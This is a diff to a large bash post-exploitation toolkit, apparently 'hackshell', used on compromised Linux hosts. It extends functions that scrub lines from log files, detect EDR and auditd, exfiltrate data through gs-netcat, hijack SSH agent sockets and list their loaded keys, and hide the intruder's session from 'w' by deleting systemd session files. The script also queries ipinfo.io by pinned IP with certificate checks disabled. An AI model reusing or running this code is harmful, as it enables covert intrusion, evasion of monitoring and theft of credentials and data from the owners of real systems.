@@ -151,11 +151,18 @@ noansi() { sed -e 's/\x1b\[[0-9;]*m//g'; }
 alias nocol=noansi
 
 xlog() {
-    local pattern=${1:?} file=${2:?};
-    pattern=${pattern//\//\\/};
-    local a;
-    a="$(sed -E "/$pattern/d" <"$file")" || return;
-    printf '%s\n' "$a" > "$file"
+    local pattern=${1:?}
+    pattern=${pattern//\//\\/}
+    shift
+    local file a
+    for file; do
+        [ ! -r "$file" ] || [ ! -w "$file" ] && {
+            HS_WARN "xlog: Unreadable or unwritable file: $file"
+            continue
+        }
+        a="$(sed -E "/$pattern/d" <"$file")" || { HS_WARN "xlog: sed failed on $file"; continue; }
+        printf '%s\n' "$a" > "$file"
+    done
 }
 
 xsu() {
@@ -599,6 +606,18 @@ ptr() {
 }
 
 rdns() { ptr "$@"; }
+
+ipinfo() {
+    command -v curl >/dev/null && {
+        curl -SsfLk --resolve ipinfo.io:443:34.117.59.81 https://ipinfo.io
+        return
+    }
+    command -v wget >/dev/null && {
+        wget -qO- --no-check-certificate --header="Host: ipinfo.io" https://34.117.59.81
+        return
+    }
+    dl https://ipinfo.io
+}
 
 # Make Wireguard use a ghost-ip.
 ghostdev() {
@@ -1371,7 +1390,10 @@ _warn_edr() {
 
     [ "${#fns[@]}" -gt 0 ] && out+="$(\ls -alrtd "${fns[@]}")"$'\n'
 
-    [ -f "/etc/audit/audit.rules" ] && grep -v ^# "/etc/audit/audit.rules" | grep -Eqm1 '.{32,}' && _hs_chk_systemd "auditd"             "Auditd [/etc/audit/rules.d]"
+    [ -f "/etc/audit/audit.rules" ] && grep -v ^# "/etc/audit/audit.rules" | grep -Eqm1 '.{32,}' && _hs_chk_systemd "auditd"             "Auditd [/etc/audit/rules.d]" && {
+        str="$(grep -m1 ^log_file /etc/audit/auditd.conf 2>/dev/null | sed 's|[^=]*=\s*||g')"
+        [ -n "$str" ] && out+="    auditd log file: $str"$'\n'
+    }
     _hs_chk_systemd "avast"                             "Avast"
     _hs_chk_systemd "bdsec"                             "Bitdefender EDR / GavityZone XDR"
     _hs_chk_systemd "cylancesvc"                        "Blackberry cyPROTECT"
@@ -1492,8 +1514,13 @@ gs-exfil-server() {
 }
 
 gs-exfil() {
-    _hs_dep gs-netcat
+    # _hs_dep gs-netcat
     _hs_dep tar
+    [ -z "$GSNC" ] && GSNC=$(command -v gs-netcat 2>/dev/null) && [ -z "$GSNC" ] && {
+        echo >&2 "gs-netcat not found."
+        return 255
+    }
+
     [ -z "$SECRET" ] && {
         echo -e >&2 "Usage: Execute ${CDC}gs-exfil-server${CN} on any server first."
         return 255
@@ -1503,8 +1530,8 @@ gs-exfil() {
 }
 
 gs-sftp-server() {
-    _hs_dep gs-netcat
-    [ -z "$GSNC" ] && GSNC=$(command -v gs-netcat 2>/dev/null) && [ -z "$GSNC"] && {
+    # _hs_dep gs-netcat
+    [ -z "$GSNC" ] && GSNC=$(command -v gs-netcat 2>/dev/null) && [ -z "$GSNC" ] && {
         echo >&2 "gs-netcat not found."
         return 255
     }
@@ -1855,13 +1882,18 @@ _hs_gen_home() {
 }
 
 lootlight() {
-    local str
+    local str pid
     ls -al "${ROOTFS}"/tmp/ssh-* &>/dev/null && {
         echo -e "${CB}SSH_AUTH_SOCK${CDY}${CF}"
         find "${ROOTFS}"/tmp -name 'agent.*' 2>/dev/null | while read -r fn; do
             unset str
-            command -v lsof >/dev/null && lsof -n "$fn" &>/dev/null && str="[ACTIVE]"
+            command -v lsof >/dev/null && {
+                pid=$(lsof -ntw "$fn" 2>/dev/null) && {
+                    str=$(realpath /proc/${pid}/exe 2>/dev/null) && str="[ACTIVE: $pid:$str]"
+                }
+            }
             echo "$(ls -al "$fn")"$'\t'"${str}"
+            str=$(SSH_AUTH_SOCK="$fn" ssh-add -l 2>/dev/null) && [ -n "$str" ] && echo -e "    ${CDY}Keys:${CF} $str"
         done
         echo -en "${CN}"
     }
@@ -2675,7 +2707,6 @@ _hs_init_ghost() {
         _HS_CG_GHOST="${cg_root}/update/cgroup.procs"
         return 0
     }
-    _HS_CG_GHOST="NA"
     return 255
 }
 
@@ -2749,7 +2780,7 @@ hs_init_shell() {
 hs_info() {
     local now="$(date +%s)"
     local mytty="$(tty 2>/dev/null)"
-    local u x t out
+    local u x t out fn
 
     [ -z "$QUIET" ] && [ -z "$_HS_HUSH" ] && {
         echo -e ">>> Type ${CDC}xhome${CN} to set HOME=${CDY}${XHOME}${CN}"
@@ -2777,6 +2808,13 @@ hs_info() {
         ps a -o tty,pid,cmd 2>/dev/null | grep "${_HS_GREP_COLOR_NEVER[@]}" ^"${t#/dev/}" 2>/dev/null | cut -c -${COLUMNS:-80}
         echo -en "${CN}"
     done
+
+    fn="/run/systemd/sessions/${XDG_SESSION_ID}"
+    [ -n "$XDG_SESSION_ID" ] && [ -s "$fn" ] && ! grep -aqFm1 /var/run/utmp "$(which w)" 2>/dev/null && {
+        HS_WARN "Not hidden from ${CDC}w${CDM}. Try ${CDC}rm -f ${fn}${CDM}"
+        echo -e "${CDY}${CF}$(w -h 2>/dev/null)${CN}"
+    }
+
     # This will also init ghost()
     _hs_init_ghost && echo -e "Ghost IP active. Try ${CDC}ghost <PID>${CN}"
 }
